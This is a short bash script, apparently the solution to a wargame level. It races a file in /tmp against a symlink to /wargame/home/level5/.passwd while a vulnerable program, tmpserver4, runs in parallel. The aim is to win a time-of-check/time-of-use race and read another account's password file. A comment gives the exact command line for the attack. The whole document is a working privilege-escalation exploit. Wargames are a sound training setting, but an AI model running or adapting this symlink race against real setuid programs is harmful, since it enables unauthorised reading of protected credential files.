#!/bin/bash
for i in {1..10000}; do
	touch /tmp/my_race
	rm /tmp/my_race
	ln -s /wargame/home/level5/.passwd /tmp/my_race
	rm /tmp/my_race
done

# now run:
# $ ./attack.sh & for i in {1..100}; do /wargame/bin/tmpserver4 my_race; done
